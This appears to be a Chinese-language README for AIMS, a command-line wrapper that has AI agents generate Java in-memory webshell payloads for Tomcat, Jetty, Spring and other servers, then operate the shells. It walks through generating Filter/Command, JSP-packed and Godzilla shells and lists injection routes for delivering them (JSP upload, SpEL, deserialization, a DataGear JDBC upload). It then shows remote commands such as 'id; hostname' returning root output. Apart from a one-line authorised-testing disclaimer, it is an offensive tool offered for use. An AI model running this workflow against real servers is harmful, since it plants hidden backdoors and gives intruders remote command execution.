# AIMS — AI-friendly MemShellParty wrapper

一个小而通用的 JSON CLI，给 AI Agent 生成内存马 payload 并操作 Command 壳。

- **生成**：完全调用 [MemShellParty](https://github.com/MemShellParty/MemShellParty)（MIT），支持 Tomcat / Jetty / Spring 等主流中间件与多种 shell 工具、packer；
- **不绑定任何靶场/漏洞/投递方式**：AIMS 只产出 payload 文件，投递由你现有的注入点完成；
- **AI 友好**：单行 JSON 输出、`schema` 命令、状态文件、无交互；
- **轻量**：Python 标准库，无第三方依赖。

> 仅用于已授权测试。

---

## 快速开始

```bash
python3 aims.py up          # 启动本地 MemShellParty (Docker, 127.0.0.1:8080)

python3 aims.py caps        # 支持哪些 server/tool/type/packer
python3 aims.py caps --server Tomcat
python3 aims.py caps --packers

# 生成 Jetty 8.1 Filter Command 壳（随机参数名 + 固定路径）
python3 aims.py gen --server Jetty --version 8.1 --type Filter --tool Command \
  --param mysecret --pattern /static/mysecret

# payload 落在 ~/.aims/payloads/<sha>.b64
# 用你现有的注入点投递（JSP 上传 / SpEL / 反序列化 / Agent ...）

# 若目标已有 Command 壳，直接执行
python3 aims.py exec --url https://TARGET/static/mysecret --param mysecret 'id; hostname'
```

也可以让 `gen` 记住 target，后续直接 `exec`：

```bash
python3 aims.py gen --server Jetty --version 8.1 --type Filter --tool Command \
  --target https://TARGET --pattern /static/mysecret --param mysecret
python3 aims.py exec 'id'
python3 aims.py status
```

所有命令输出单行 JSON：

```json
{"ok":true,"command":"exec","data":{"output":"uid=0(root) ...\n"},"error":null}
```

失败：

```json
{"ok":false,"command":"exec","data":{},"error":{"code":"E_SHELL","message":"shell not responding (HTTP 302)"}}
```

退出码：`0` 成功，`1` 失败。

---

## 命令

| 命令 | 作用 |
|---|---|
| `up` | 启动本地 MemShellParty 容器（或 `AIMS_MSP` 指定远程实例） |
| `caps` | 查看 server / tool / type / packer 能力 |
| `gen` | 生成 payload，写文件 + 状态 |
| `exec` | 对 Command 壳执行命令 |
| `status` | `id; hostname` 健康检查 |
| `doctor` | 检查 MemShellParty / Docker / packer / 状态 |
| `schema` | 机器可读命令定义（给 LLM function calling） |

### gen

```bash
python3 aims.py gen --server <Server> [--version <ver>] [--type <Type>] \
  [--tool <Tool>] [--jre 52] [--packer <Packer>] \
  [--param <name>] [--pattern <urlPattern>] [--target <baseURL>] \
  [--tool-config k=v ...] [--injector-config k=v ...] \
  [--out file] [--print]
```

- `--server`：`Tomcat`、`Jetty`、`SpringWebMvc`、`Undertow`、`WebLogic` … 用 `caps` 查看完整列表；
- `--type`：`Filter`（默认）、`Servlet`、`Listener`、`Interceptor`、`Handler` … 不同 server 支持不同；
- `--tool`：`Command`（默认）、`Godzilla`、`Behinder`、`Suo5` …；
- `--packer`：`DefaultBase64`（默认）、`JSP`、`JavaDeserialize`、`SpEL`、`AgentJar` … 用 `caps --packers` 查看；
- `--param`：Command 壳的请求参数名（同时视为密钥；缺省随机）；
- `--pattern`：注入器映射的 URL（默认 `/*`）；
- `--target`：仅用于在状态里拼出 `shell_url`，不发起任何请求；
- `--tool-config` / `--injector-config`：透传给 MemShellParty 的键值（如 Godzilla 的 `pass`/`key`）；
- payload 写入 `~/.aims/payloads/<sha>.<ext>`，`--out` 可指定路径；`--print` 把 payload 放进 JSON。

示例：

```bash
# Tomcat 9 + Filter + Command + JSP 落地文件
python3 aims.py gen --server Tomcat --version 9 --type Filter --tool Command \
  --packer JSP --out /tmp/shell.jsp

# Spring WebMvc + Interceptor + Command
python3 aims.py gen --server SpringWebMvc --version 5.3 --type Interceptor --tool Command

# Godzilla 工具（参数按 MemShellParty 的约定）
python3 aims.py gen --server Tomcat --version 9 --type Filter --tool Godzilla \
  --tool-config pass=pass123 --tool-config key=key123
```

### exec / status

仅支持 **Command** 壳（`paramName` 协议）：

- 请求：`POST <shell_url>`，表单参数名 = `paramName`，值 = `encryptor(cmd)`；
- `--encryptor`：`RAW`、`BASE64`、`DOUBLE_BASE64`；未指定时用 `gen` 状态里的值；
- 回显：命令输出明文；
- Godzilla / Behinder / Suo5 等请使用 MemShellParty 自带客户端。

---

## 状态与文件

- 状态：`~/.aims/state.json`（600），保存最近一次 `gen` 的 target/param/encryptor/shell_url/payload_file；
- payload：`~/.aims/payloads/<sha>.<ext>`（600）；
- `exec`/`status` 在未给 `--url/--param` 时读取状态。

---

## 给 AI 用

```bash
python3 aims.py schema
```

返回每个命令的参数定义，可直接映射为 function calling。约定：

- stdout 永远是 JSON；无交互提示；
- 状态跨命令保留；payload 只写文件，避免把大段 Base64 塞进模型上下文；
- 失败时 `ok=false` + `error.code`，退出码 1。

典型工作流：

1. `caps` 确认目标中间件支持的类型；
2. `gen` 生成 payload（选择合适的 packer）；
3. 用现有的漏洞/注入点投递 payload；
4. `exec` / `status` 操作壳。

---

## 扩展示例

`examples/` 放场景扩展，核心不包含任何投递代码：

- [`examples/datagear-jdbc`](examples/datagear-jdbc)：DataGear 管理员 JDBC 驱动上传 → `jdbc:party:<Base64(injector)>` 投递示例。

---

## 环境

- Python 3.8+；
- Docker（本地生成器）；离线环境可预拉 `reajason/memshell-party:latest`，或设置 `AIMS_MSP=http://your-msp:8080` 指向自建/远程实例；
- 生成器 API：`/api/config`、`/api/config/shelltool/configs`、`/api/config/packers/tree`、`/api/memshell/generate`。

## 限制

- 内存马只在 JVM 内存中，应用重启即消失；
- `exec` 仅支持 Command 壳；
- AIMS 不提供投递/漏洞利用，只生成 payload；
- 不同中间件/版本的可用组合以 `caps` 与 MemShellParty 为准。

## 上游与许可

- **MemShellParty** — MIT，Copyright (c) 2024 ReaJason
  <https://github.com/MemShellParty/MemShellParty>
- **su18/MemoryShell** — Jetty Filter 注入技术参考 <https://github.com/su18/MemoryShell>
- AIMS 自身代码：MIT（见 LICENSE），详见 [NOTICE](NOTICE)。
